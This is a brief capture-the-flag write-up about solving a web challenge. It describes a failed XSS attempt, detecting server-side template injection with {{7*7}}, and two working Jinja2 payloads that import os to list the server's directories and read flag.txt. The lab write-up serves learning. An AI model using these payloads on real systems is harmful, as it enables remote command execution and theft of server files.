In this challenge I checked developer tools where i code the link for source code of the webpage. <br>
From there i saw innerHTML had been used, hence i tried using xss payload with alert which gave a positive response. However there was no progress along that track. <br>
<br>
Then putting {{7*7}} into the input box, we get 49 as output, which tells us it is vulnerable to SSTI. Hence gogggling on how to read files from a server using ssti attack, came across the payload 

``` {{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}```

This gives us a list of all directories which showed the presence of flag.txt. Hence using the below payload gives us the flag.

```{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}``` 
